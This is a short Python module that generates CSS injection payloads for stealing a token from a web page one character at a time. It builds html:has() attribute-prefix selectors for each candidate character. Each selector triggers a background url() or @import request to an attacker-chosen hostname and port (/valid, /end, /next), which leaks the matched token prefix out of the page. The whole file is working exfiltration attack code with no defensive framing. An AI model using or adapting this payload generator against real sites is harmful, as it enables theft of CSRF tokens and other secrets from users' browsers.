import urllib.parse


def generate_payload(hostname, port, identifier, selector, client):
    stri = generate_next_import(hostname=hostname, port=port, client=client)

    # Check if the token is complete
    stri += f'html:has({identifier}[{selector}={repr(client.data)}]{"".join([f":not({identifier}[{selector}={repr(element)}])" for element in client.elements])}){"".join([":first-child" for i in range(client.counter)])}{{background: url("//{hostname}:{port}/end?num={client.counter}&id={client.id}") !important;}}'

    # Payload to extract the token
    stri += "".join(
        map(
            lambda x: f"html:has({identifier}[{selector}^={repr(client.data+x)}]"
            f'{"".join([f":not({identifier}[{selector}={repr(element)}])" for element in client.elements])})'
            f'{"".join([":first-child" for i in range(client.counter)])}'
            f'{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(client.data+x)}&id={client.id}") !important;}}\n',
            "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
        )
    )
    return stri


def generate_next_import(hostname, port, client):
    return (
        f"@import url('//{hostname}:{port}/next?num={client.counter}&id={client.id}');"
    )
